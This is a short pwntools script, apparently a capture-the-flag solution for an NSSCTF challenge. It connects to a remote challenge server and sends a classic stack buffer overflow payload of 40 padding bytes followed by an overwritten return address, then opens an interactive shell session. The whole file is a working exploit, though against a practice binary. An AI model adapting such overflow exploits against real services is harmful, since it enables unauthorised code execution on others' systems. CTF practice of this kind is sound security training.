from pwn import *
elf=ELF('./pwn')
p=remote('node4.anna.nssctf.cn',29942)

payload=b'a'*40+p64(0x40072c)
p.sendline(payload)
p.interactive()